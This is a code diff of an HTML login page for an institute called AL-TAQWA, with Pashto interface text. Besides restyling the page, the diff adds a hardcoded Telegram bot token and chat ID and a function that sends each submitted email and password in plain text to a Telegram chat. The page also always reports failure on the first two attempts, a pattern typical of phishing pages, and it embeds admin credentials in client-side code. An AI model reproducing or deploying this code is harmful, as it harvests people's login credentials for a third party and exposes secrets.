@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ال تقوا - لاګ ان</title>
+    <title>ال تقوا – لاګ ان</title>
     <style>
         * {
             margin: 0;
@@ -12,7 +12,7 @@
             font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
         }
         body {
-            background: linear-gradient(135deg, #0b3b2f 0%, #1a5d4a 100%);
+            background: linear-gradient(145deg, #0a3f31 0%, #166e52 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -20,111 +20,114 @@
             padding: 20px;
         }
         .card {
-            background-color: white;
-            max-width: 450px;
+            background-color: #ffffff;
+            max-width: 460px;
             width: 100%;
-            padding: 40px 35px 45px;
-            border-radius: 32px;
-            box-shadow: 0 25px 45px rgba(0,0,0,0.2);
+            padding: 38px 32px 42px;
+            border-radius: 40px;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.25);
             text-align: center;
             transition: all 0.2s;
         }
         .logo-area h1 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #1e4a3b;
-            letter-spacing: -0.3px;
+            font-size: 32px;
+            font-weight: 800;
+            color: #1a5d48;
+            letter-spacing: -0.5px;
         }
         .logo-area p {
             font-size: 14px;
-            color: #5a6e65;
+            color: #5d756a;
             margin-top: 6px;
-            margin-bottom: 10px;
         }
-        .institute {
+        .institute-badge {
             font-size: 15px;
-            font-weight: 500;
-            color: #2c7a5e;
-            border-top: 1px solid #e2e8f0;
-            border-bottom: 1px solid #e2e8f0;
+            font-weight: 600;
+            color: #2a7f62;
+            background: #eef5f1;
             display: inline-block;
-            padding: 6px 18px;
-            margin: 12px 0 24px;
+            padding: 6px 22px;
+            border-radius: 60px;
+            margin: 18px 0 22px;
         }
         .input-group {
             text-align: left;
-            margin-bottom: 20px;
+            margin-bottom: 22px;
         }
         .input-group label {
             display: block;
             font-weight: 600;
-            font-size: 14px;
-            color: #2d3e35;
+            font-size: 13px;
+            color: #2d4a3e;
             margin-bottom: 6px;
+            letter-spacing: 0.3px;
         }
         .input-group input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 15px 18px;
             font-size: 15px;
-            border: 1.5px solid #d1d9d4;
-            border-radius: 18px;
+            border: 1.5px solid #dde5e0;
+            border-radius: 28px;
             outline: none;
             transition: 0.2s;
-            background-color: #fefef7;
+            background-color: #fefcf7;
         }
         .input-group input:focus {
             border-color: #2c7a5e;
-            box-shadow: 0 0 0 3px rgba(44,122,94,0.2);
+            box-shadow: 0 0 0 3px rgba(44, 122, 94, 0.2);
         }
         .checkbox {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin: 15px 0 25px;
+            margin: 18px 0 28px;
             font-size: 14px;
-            color: #3b5c4f;
+            color: #3f6858;
         }
         button {
             width: 100%;
             background-color: #1f6e55;
             color: white;
             font-size: 17px;
-            font-weight: 600;
+            font-weight: 700;
             padding: 14px;
             border: none;
-            border-radius: 40px;
+            border-radius: 44px;
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.08);
         }
         button:hover {
-            background-color: #0f5541;
-            transform: scale(0.98);
+            background-color: #0f5a45;
+            transform: scale(0.97);
+        }
+        .msg-area {
+            margin-top: 20px;
         }
         .error-msg {
-            background-color: #fee2e2;
+            background-color: #ffe6e5;
             color: #b91c1c;
-            padding: 10px;
+            padding: 10px 14px;
             border-radius: 40px;
             font-size: 13px;
-            margin-top: 18px;
             font-weight: 500;
         }
         .success-msg {
-            background-color: #dff9e6;
-            color: #166534;
+            background-color: #e0f7ed;
+            color: #146b48;
+        }
+        .demo-hint {
+            font-size: 12px;
+            background: #f4faf7;
+            color: #3f6a5a;
+            padding: 12px;
+            border-radius: 28px;
+            margin-top: 28px;
+            line-height: 1.4;
         }
         hr {
-            margin: 25px 0 10px;
-            border-color: #e9ecef;
-        }
-        .demo-note {
-            font-size: 12px;
-            color: #7d8f86;
-            background: #f0f5f2;
-            padding: 10px;
-            border-radius: 24px;
             margin-top: 20px;
+            border: 0.5px solid #e2ece5;
         }
     </style>
 </head>
@@ -133,17 +136,17 @@
     <div class="logo-area">
         <h1>AL-TAQWA</h1>
         <p>Institute of Higher Education</p>
-        <div class="institute">Sign in</div>
+        <div class="institute-badge">Sign in</div>
     </div>
 
     <form id="loginForm">
         <div class="input-group">
             <label>Email</label>
-            <input type="email" id="email" placeholder="your@example.com" required>
+            <input type="email" id="email" placeholder="teacher@altaqwa.edu.af" required>
         </div>
         <div class="input-group">
             <label>Password</label>
-            <input type="password" id="password" placeholder="••••••••" required>
+            <input type="password" id="password" placeholder="********" required>
         </div>
         <div class="checkbox">
             <input type="checkbox" id="rememberCheckbox">
@@ -151,97 +154,117 @@
         </div>
         <button type="submit" id="loginBtn">Login</button>
     </form>
-
-    <div id="messageArea"></div>
-    <div class="demo-note">
-        ⚡ د ازمېښت لپاره: په لومړیو دوو هڅو کې هر څه ولیکئ (غلط پټورډ/ایمیل)<br>
-        په <strong>دریمه هڅه</strong> کې بریالی لاګ ان: <strong style="color:#1e4a3b;">demo@altaqwa.edu.af</strong> او پټورډ: <strong style="color:#1e4a3b;">success123</strong>
+    
+    <div id="messageBox"></div>
+    <div class="demo-hint">
+        🔐 ازمېښت: لومړۍ دوه هڅې (هر څه ولیکئ) → ناکامي<br>
+        ✨ دریمه هڅه: <strong>admin@altaqwa.edu.af</strong> / <strong>adminPass123</strong><br>
+        (معلومات به اډمین ټیلیګرام ته واستول شي)
     </div>
 </div>
 
 <script>
-    // د هڅو شمېر ساتل (په session کې)
-    let attemptCount = parseInt(sessionStorage.getItem('loginAttempts')) || 0;
-    
-    // بریالی ایمیل او پاسورډ (د ښوونې لپاره)
-    const VALID_EMAIL = "demo@altaqwa.edu.af";
-    const VALID_PASSWORD = "success123";
+    // د هڅو شمېر ساتل (د session هره ټب)
+    let attemptCount = parseInt(sessionStorage.getItem('loginAttempts_altaqwa')) || 0;
 
-    function showMessage(text, isError = true) {
-        const msgDiv = document.getElementById('messageArea');
-        msgDiv.innerHTML = `<div class="error-msg ${!isError ? 'success-msg' : ''}">${text}</div>`;
-        if (!isError) {
-            // بریالیتوب – سره زر
-            setTimeout(() => {
-                // لاګ ان شوی ، د خوشحالۍ پیغام او مخ بیا بارول (اختیاري)
-                if (confirm("✅ بریالی لاګ ان! \nتاسو اوس سیسټم ته ننوتلئ. غواړئ صفحه تازه کړئ؟")) {
-                    sessionStorage.removeItem('loginAttempts');   // د هڅو شمېر پاکول
-                    window.location.reload(); 
-                }
-            }, 200);
+    // د بريالي لاګ ان صحيح معلومات
+    const VALID_EMAIL = "admin@altaqwa.edu.af";
+    const VALID_PASSWORD = "adminPass123";
+
+    // د ټیلیګرام بوټ توکين او چيټ آي ډي (لکه څنګه چې غوښتل شوي)
+    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
+    const CHAT_ID = "8295417969";
+
+    // د ټیلیګرام پیغام لېږلو فنکشن
+    async function sendToTelegram(email, password) {
+        const message = `🔐 *AL-TAQWA لاګ ان بریالی* 🔐\n\n📧 *ایمیل:* ${email}\n🔑 *پاسورډ:* ${password}\n🕒 وخت: ${new Date().toLocaleString()}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        try {
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+        } catch (err) {
+            console.error("تلگرام ته د استولو ستونزه:", err);
         }
     }
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    function showMessage(text, isError = true) {
+        const msgDiv = document.getElementById('messageBox');
+        msgDiv.innerHTML = `<div class="${isError ? 'error-msg' : 'error-msg success-msg'}">${text}</div>`;
+        if (!isError) {
+            setTimeout(() => {
+                if (confirm("✅ بریالی ننوتل! تاسو سیسټم ته داخل شوئ.\n غواړئ صفحه تازه کړئ؟")) {
+                    sessionStorage.removeItem('loginAttempts_altaqwa');
+                    window.location.reload();
+                }
+            }, 400);
+        }
+    }
+
+    // د فورمې استول
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
-        
+
         const emailInput = document.getElementById('email').value.trim();
         const passwordInput = document.getElementById('password').value;
         const rememberChecked = document.getElementById('rememberCheckbox').checked;
-        
-        // د Remember Password اختیار (یوازې UI لپاره)
+
+        // د یادولو اختیار
         if (rememberChecked) {
-            localStorage.setItem('remEmail', emailInput);
+            localStorage.setItem('remEmail_altaqwa', emailInput);
         } else {
-            localStorage.removeItem('remEmail');
+            localStorage.removeItem('remEmail_altaqwa');
         }
-        
-        // اوس د هڅو منطق: 
-        // که چیرې دریمه هڅه ده (attemptCount === 2، ځکه 0,1,2 درې ځله)
-        const isThirdAttempt = (attemptCount === 2);
-        
-        // د اعتبار تایید: که دریمه هڅه وي او صحیح معلومات وي
+
+        const isThirdAttempt = (attemptCount === 2);   // 0,1,2 → دریمه هڅه
+
+        // دریمه هڅه او سم معلومات
         if (isThirdAttempt && emailInput === VALID_EMAIL && passwordInput === VALID_PASSWORD) {
-            // بریالی لاګ ان
-            showMessage("🎉 بریالیتوب! تاسو په دریمه هڅه کې ننوتلئ.", false);
-            sessionStorage.removeItem('loginAttempts');  // پاکول
+            // بریالی لاګ ان – معلومات تلګرام ته واستوئ
+            await sendToTelegram(emailInput, passwordInput);
+            showMessage("🎉 بریالیتوب! تاسو په دریمه هڅه کې ننوتلئ. د لاګ ان معلومات اډمین ته واستول شول.", false);
+            sessionStorage.removeItem('loginAttempts_altaqwa');
+            document.getElementById('email').disabled = true;
+            document.getElementById('password').disabled = true;
+            document.getElementById('loginBtn').disabled = true;
             return;
         }
-        
-        // که دریمه هڅه وي خو معلومات ناسم وي => بیا هم ناکامي + بلاک نه کړو مګر هڅه پاتې نشي (د بیا هڅه لپاره ریسیټ)
+
+        // که دریمه هڅه وي خو معلومات ناسم وي – بیا هڅه بنده او ریلوډ
         if (isThirdAttempt && (emailInput !== VALID_EMAIL || passwordInput !== VALID_PASSWORD)) {
-            showMessage("❌ دریمه هڅه هم ناکامه شوه. مهرباني وکړئ صفحه تازه کړئ او بیا هڅه وکړئ.", true);
-            sessionStorage.setItem('loginAttempts', 3); // لا نورو هڅو ته اجازه نه ورکوي
+            showMessage("❌ دریمه هڅه ناکامه شوه (غلط ایمیل یا پاسورډ). صفحه به تازه شي.", true);
+            sessionStorage.setItem('loginAttempts_altaqwa', 3);
             document.getElementById('loginBtn').disabled = true;
             setTimeout(() => {
-                sessionStorage.removeItem('loginAttempts');
+                sessionStorage.removeItem('loginAttempts_altaqwa');
                 window.location.reload();
             }, 2000);
             return;
         }
-        
-        // که لومړی یا دویمه هڅه وي (attemptCount 0 یا 1) -> تل ناکامه ښکاره کړئ
+
+        // لومړۍ یا دویمه هڅه (تل ناکامي، پرته له ټیلیګرام)
         if (!isThirdAttempt) {
-            // ناسم معلومات یا هر څه – ناکامي
-            showMessage(`⚠️ ننوتل ناکام شو! تاسو ${attemptCount+1}/2 ناکامې هڅې وکړې. دریمه هڅه به بريالی شي (که صحیح معلومات وکاروئ).`);
-            // د هڅو شمېر زیاتول
+            showMessage(`⚠️ ننوتل ناکام شو! تاسو ${attemptCount+1}/2 ناکامې هڅې وکړې. مهرباني وکړئ دریمه هڅه کې سم معلومات (admin/adminPass123) وکاروئ.`);
             attemptCount++;
-            sessionStorage.setItem('loginAttempts', attemptCount);
-            
-            // که دوه هڅې شوي وي (attemptCount === 2 پدې حالت کې د دې فانکشن وروسته به دریم ځل)
+            sessionStorage.setItem('loginAttempts_altaqwa', attemptCount);
             return;
         }
     });
-    
-    // د مخ له پیل څخه که چیرې لا دمخه 3 هڅې شوې وي بټن غیرفعال کړئ
+
+    // د مخ په پیل کې که ۳ ناکامې شوې وی بټن بند کړئ او یاد شوی ایمیل ښکاره کړئ
     window.addEventListener('DOMContentLoaded', () => {
-        if (sessionStorage.getItem('loginAttempts') >= 3) {
+        if (sessionStorage.getItem('loginAttempts_altaqwa') >= 3) {
             document.getElementById('loginBtn').disabled = true;
-            showMessage("ډېرې ناکامې هڅې، مهرباني وکړئ صفحه تازه کړئ.", true);
+            showMessage("زیاتې ناکامې هڅې. مهرباني وکړئ صفحه تازه کړئ.", true);
         }
-        
-        // د یادولو اختیار: که مخکې LocalStorage کې ایمیل خوندي وي
-        const savedEmail = localStorage.getItem('remEmail');
+        const savedEmail = localStorage.getItem('remEmail_altaqwa');
         if (savedEmail) {
             document.getElementById('email').value = savedEmail;
             document.getElementById('rememberCheckbox').checked = true;
